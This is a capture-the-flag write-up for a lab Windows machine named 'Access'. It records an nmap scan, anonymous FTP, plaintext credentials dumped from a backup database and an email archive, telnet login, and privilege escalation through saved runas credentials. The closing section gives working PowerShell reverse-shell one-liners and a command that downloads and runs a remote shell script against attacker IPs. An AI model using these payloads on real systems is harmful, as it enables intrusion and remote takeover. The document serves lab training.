



- Learnt how to use cmdkey list and use runas command


```
kali@kali ~> nmap -sC -sV -Pn 10.10.10.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 18:47 EDT
Nmap scan report for 10.10.10.98
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.15 seconds


```


## FTP findings

```
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

```
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
```

```
ftp> cd Engineer
ls
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```



# Unzipping process

```
kali@kali ~/H/access> 7z x 'Access Control.zip'

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Would you like to replace the existing file:
  Path:     ./Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
with the file from archive:
  Path:     Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y


Enter password (will not be echoed):

```


It needs a password so lets look at the other file!

I had to install mdbtools to be able to read the file

```
kali@kali ~/H/access> mdb
mdb-array    (Export data in an MDB database table to a C array.)  mdb-json  (Export data in an MDB database table to JSON.)  mdb-sql                   (SQL interface to MDB Tools)
mdb-count              (Get listing of tables in an MDB database)  mdb-parsecsv        (Convert CSV table dump into C file.)  mdb-tables  (Get listing of tables in an MDB database)
mdb-export  (Export data in an MDB database table to CSV format.)  mdb-prop          (Get properties list from MDB database)  mdb-ver   (Return the format of a given MDB database.)
mdb-header               (Write header file from an MDB database)  mdb-queries    (Get listing of tables in an MDB database)
mdb-hexdump                      (Hexdump utility from MDB Tools)  mdb-schema                 (Generate schema creation DDL)

```


ph boy... alotta options, lets list the tables to see what we need to do here

```
kali@kali ~/H/access [1]> mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx

```


a quick look at the GitHub documentation 

|Command|Description|
|---|---|
|`mdb-ver`|Prints the version (JET 3 or 4) of an mdb file.|
|`mdb-schema`|Prints DDL for the specified table.|
|`mdb-export`|Export table to CSV or SQL formats.|
|`mdb-json`|Export table to JSON format.|
|`mdb-tables`|A simple dump of table names to be used with shell scripts.|
|`mdb-count`|A simple count of number of rows in a table, to be used in shell scripts and ETL pipelines.|
|`mdb-sql`|A simple SQL engine (also used by ODBC and gmdb).|
|`mdb-queries`|List and print queries stored in the database.|
|`mdb-hexdump`*|(in [src/extras](https://github.com/mdbtools/mdbtools/blob/dev/src/extras)) Simple hex dump utility to look at mdb files.|
|`mdb-array`*|Export data in an MDB database table to a C array.|
|`mdb-header`*|Generates a C header to be used in exporting mdb data to a C prog.|
|`mdb-parsecsv`*|Generates a C program given a CSV file made with mdb-export.|

SO now we know what we can use `mdb-json` to export the stuff we need

```
kali@kali ~/H/access> mdb-json backup.mdb auth_user
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```



so now we unzip it using the engineers password, now we have the PST 

```
kali@kali ~/H/access> lspst Access\ Control.pst
Email	From: john@megacorp.com	Subject: MegaCorp Access Control System "security" account
```

```
kali@kali ~/H/access> cat 'Access Control.mbox'
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;



Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```


```
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-307239595_-_-"


----boundary-LibPST-iamunique-307239595_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-307239595_-_-"

--alt---boundary-LibPST-iamunique-307239595_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,



The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.



Regards,

John


--alt---boundary-LibPST-iamunique-307239595_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
	{mso-style-priority:99;
	color:#0563C1;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{mso-style-priority:99;
	color:#954F72;
	text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
	{mso-style-name:msonormal;
	mso-margin-top-alt:auto;
	margin-right:0in;
	mso-margin-bottom-alt:auto;
	margin-left:0in;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
span.EmailStyle18
	{mso-style-type:personal-compose;
	font-family:"Calibri",sans-serif;
	color:windowtext;}
.MsoChpDefault
	{mso-style-type:export-only;
	font-size:10.0pt;
	font-family:"Calibri",sans-serif;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-307239595_-_---

----boundary-LibPST-iamunique-307239595_-_---

```

`security:4Cc3ssC0ntr0ller`


```
kali@kali ~> telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

08/23/2018  11:52 PM    <DIR>          .
08/23/2018  11:52 PM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,347,152,896 bytes free

C:\Users\security>

```


```
C:\Users\security\Desktop>type user.txt
309d3aae11c2aeafadefade954eaa39c
```

```
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\

08/23/2018  11:05 PM    <DIR>          inetpub
07/14/2009  04:20 AM    <DIR>          PerfLogs
08/23/2018  09:53 PM    <DIR>          Program Files
08/24/2018  08:40 PM    <DIR>          Program Files (x86)
08/24/2018  08:39 PM    <DIR>          temp
08/21/2018  11:31 PM    <DIR>          Users
07/14/2021  02:04 PM    <DIR>          Windows
08/22/2018  08:23 AM    <DIR>          ZKTeco
               0 File(s)              0 bytes
               8 Dir(s)   3,347,152,896 bytes free

```

2 directories immediately stood out to me, ZKTeco and temp. I checked ZKTeco and found nothing so now to check tmp and i checked the scripts and we have credentials there


```
C:\temp\scripts>type README_FIRST.txt
Open the SQL Management Studio application located either here:
   "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
Or here:
   "C:\Program Files\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"

- When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".

   "Login:" = "sa"
   "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"

- Click "Connect", once connected click on the "Open File" icon, navigate to the folder where the scripts are saved (c:\temp\scripts).
- Select each script in order of name by the first number in the name and run them in order e.g. "1_CREATE_SYSDBA.sql" then "2_ALTER_SERVER_ROLE.sql" then "3_SP_ATTACH_DB.sql" then "4_ALTER_AUTHORIZATION.sql"
If the scripts begin from "2_*.sql" or "3_*.sql" it means the previous scripts ran fine, so begin from the lowest script number ascending.

For the vbs scripts:
- Go to windows Services and stop ALL SQL related services.
- Open command prompt with elevated privileges (Administrator).
- paste the following commands in command prompt for each script and click ENTER...
	1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"
	2. cmd.exe /c WScript.exe "c:\temp\scripts\SQLServerCfgPort.vbs" "C:\Windows\system32" "c:\temp\logs\" "NO_INSTANCES_FOUND"
	3. cmd.exe /c WScript.exe "c:\temp\scripts\SetAccessRuleOnDirectory.vbs" "C:\Windows\system32" "c:\temp\logs\" "NT AUTHORITY\SYSTEM" "C:\\Portal\database"
	4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe "c:\temp\scripts\RestartServiceByDescriptionNameLike.vbs" "C:\Windows\system32" "c:\temp\logs\" "SQL Server (NO_INSTANCES_FOUND)"

```




```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
LF@ 7�7����P/P���i�+00/C:\R1M�Windows�:M�*wWindowsV1MVSystem32�:MV*�System32X2P�� runas.exe�:1�1*Yrunas.exeL-K�EC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exe C:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%�
                                                                                                                                                                                                       wN�]ND.Q�`Xaccess��8{E3
         O�)H�
              )ΰ[��8{E3
                       O�)H�
                            )ΰ[	1SPS�FL8C&m�*S-1-5-21-953262931-566350628-63446256-500

```



```
C:\ZKTeco\ZKAccess3.5>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```


```
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```


```
runas /savecred /user:ACCESS\Administrator "type C:\Users\Administrator\Desktop\root.txt"
```

```
runas.exe /savecred /user:ACCESS\Administrator "cmd.exe /K type C:\Users\Administrator\Desktop\root.txt"
```

```
runas.exe /savecred /user:ACCESS\Administrator "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.17 9991"
```


```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator  /savecred  "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```


```
#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```


```
powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```